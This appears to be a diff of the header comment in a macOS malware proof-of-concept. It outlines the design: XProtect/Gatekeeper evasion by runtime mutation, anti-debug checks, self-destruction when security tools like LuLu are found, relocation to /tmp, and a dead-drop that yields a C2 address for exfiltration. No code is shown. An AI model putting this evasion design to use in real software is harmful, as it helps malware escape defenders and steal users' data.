@@ -5,14 +5,27 @@
  * - XProtect consistently fails to detect it due to runtime mutation.
  * - Originally developed from internal research and shared publicly to demonstrate core techniques.
  *   – Fully extensible for new techniques.
- *   – Basic macOS Gatekeeper/XProtect evasion is integrated, but
- *     this is meant to be a research sample, not a production release.
- *     Some modifications are needed to fix certain issues and update a few functions for proper execution.
- *     For now, you can test the mutation and execution with the simple function below and run `./testme.sh` for more verbose output.
- *     Operational code can still be performed if you know what you're doing.
- *     More details will be covered in the next part of the series (III).
+ *     This is meant to be a research sample, not a production release.
+ *     For now, you can test the mutation and execution with the simple function below,
+ *     run `./testme.sh` for more verbose output. 
  *
- * 
+ * + Execution Flow:
+ *   - An anti-debug check is performed first, using simple symbol obfuscation.
+ *   - Paths to Objective-See tools (e.g., LuLu) are decrypted in memory and checked for presence on the host.
+ *     If detected, the binary is corrupted and self-destructs.
+ *   - Then, the binary checks its initial execution location:
+ *     - If running from ~/Downloads, it copies itself to /tmp and re-executes.
+ *     - If all good, it proceeds with its main routine.
+ *
+ * + Note:
+ *   - Execution follows a simple call sequence.
+ *   - OvernOut() requires a few tweaks in logic order to proceed with the dead-drop
+ *     and extract the C2 address and public key for exfiltration. ;)
+ *   - It's there for a reason, you’ll see it. I’m not handing out malware for free. ;)
+ *   - The auth() function requires a valid key in the vault, either decrypted at runtime
+ *     or embedded directly.
+ *   - A correct key is essential for successful execution.
+ *
  * + Purpose:
  * Proof-of-Concept (PoC) for demonstrating custom malware development techniques on macOS.
  */
